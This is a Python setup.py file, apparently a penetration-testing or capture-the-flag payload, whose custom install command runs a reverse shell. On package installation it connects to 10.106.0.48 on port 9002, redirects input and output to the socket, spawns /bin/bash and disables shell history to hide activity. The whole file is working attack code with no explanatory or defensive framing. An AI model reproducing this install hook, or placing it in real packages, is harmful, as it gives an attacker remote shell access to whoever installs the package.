from setuptools import setup
from setuptools.command.install import install
import base64
import os


class pip_rev_shell(install):
    def run(self):
        install.run(self)
        LHOST = '10.106.0.48'
        LPORT = 9002
        reverse_shell = 'python -c "import os; import pty; import socket; s = socket.socket(socket.AF_INET, socket.SOCK_STREAM); s.connect((\'{LHOST}\', {LPORT})); os.dup2(s.fileno(), 0); os.dup2(s.fileno(), 1); os.dup2(s.fileno(), 2); os.putenv(\'HISTFILE\', \'/dev/null\'); pty.spawn(\'/bin/bash\'); s.close();"'.format(LHOST=LHOST,LPORT=LPORT)
        os.system(reverse_shell)


setup(
    name='OUHHAHAHAH',
    cmdclass={'install': pip_rev_shell}
)
